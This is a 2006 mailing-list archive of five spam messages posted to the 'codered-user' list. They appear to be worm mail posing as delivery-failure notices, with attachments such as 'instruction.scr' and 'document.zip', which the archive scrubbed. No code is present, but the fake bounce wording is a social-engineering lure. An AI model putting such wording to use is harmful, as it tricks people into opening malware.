@@ -1,0 +1,103 @@
+From petrominer at ub.net.id  Wed Aug  2 06:40:15 2006
+From: petrominer at ub.net.id (petrominer at ub.net.id)
+Date: Wed, 2 Aug 2006 00:40:15 -0400
+Subject: [Codered-user] DELIVERY REPORTS ABOUT YOUR E-MAIL
+Message-ID: <20060802043535.C3D205AFAF@bat.berlios.de>
+
+The original message was included as attachment
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: document.zip
+Type: application/octet-stream
+Size: 28954 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060802/de85d3c9/attachment.obj>
+
+From acronym-archive at lists.ietf.org  Sat Aug  5 04:34:33 2006
+From: acronym-archive at lists.ietf.org (acronym-archive at lists.ietf.org)
+Date: Fri, 4 Aug 2006 22:34:33 -0400
+Subject: [Codered-user] Returned mail: see transcript for details
+Message-ID: <20060805023551.084BB607A9@bat.berlios.de>
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: instruction.scr
+Type: application/octet-stream
+Size: 28832 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060804/650fc6e8/attachment.obj>
+
+From noreply at lists.berlios.de  Wed Aug  9 08:25:20 2006
+From: noreply at lists.berlios.de (The Post Office)
+Date: Wed, 9 Aug 2006 02:25:20 -0400
+Subject: [Codered-user] Delivery reports about your e-mail
+Message-ID: <20060809062052.296A661EE7@bat.berlios.de>
+
+The original message was included as attachment
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: message.zip
+Type: application/octet-stream
+Size: 29072 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060809/818cb681/attachment.obj>
+
+From drt at omegaone.com  Fri Aug 11 08:23:34 2006
+From: drt at omegaone.com (drt at omegaone.com)
+Date: Fri, 11 Aug 2006 02:23:34 -0400
+Subject: [Codered-user] Delivery failed
+Message-ID: <20060811061529.A654060A05@bat.berlios.de>
+
+This message was undeliverable due to the following reason:
+
+Your message could not be delivered because the destination server was
+not reachable within the allowed queue period. The amount of time
+a message is queued before it is returned depends on local configura-
+tion parameters.
+
+Most likely there is a network problem that prevented delivery, but
+it is also possible that the computer is turned off, or does not
+have a mail system running right now.
+
+Your message could not be delivered within 4 days:
+Host 122.243.161.29 is not responding.
+
+The following recipients did not receive this message:
+<codered-user at lists.berlios.de>
+
+Please reply to postmaster at lists.berlios.de
+if you feel this message to be in error.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: instruction.scr
+Type: application/octet-stream
+Size: 28832 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060811/958a77e3/attachment.obj>
+
+From noreply at lists.berlios.de  Sun Aug 13 06:52:29 2006
+From: noreply at lists.berlios.de (Mail Delivery Subsystem)
+Date: Sun, 13 Aug 2006 00:52:29 -0400
+Subject: [Codered-user] Mail System Error - Returned Mail
+Message-ID: <20060813044154.89BF062E5E@bat.berlios.de>
+
+The original message was received at Sun, 13 Aug 2006 00:52:29 -0400 from [80.184.54.217]
+
+----- The following addresses had permanent fatal errors -----
+codered-user at lists.berlios.de
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: document.zip
+Type: application/octet-stream
+Size: 29076 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060813/ec82c3bc/attachment.obj>
+
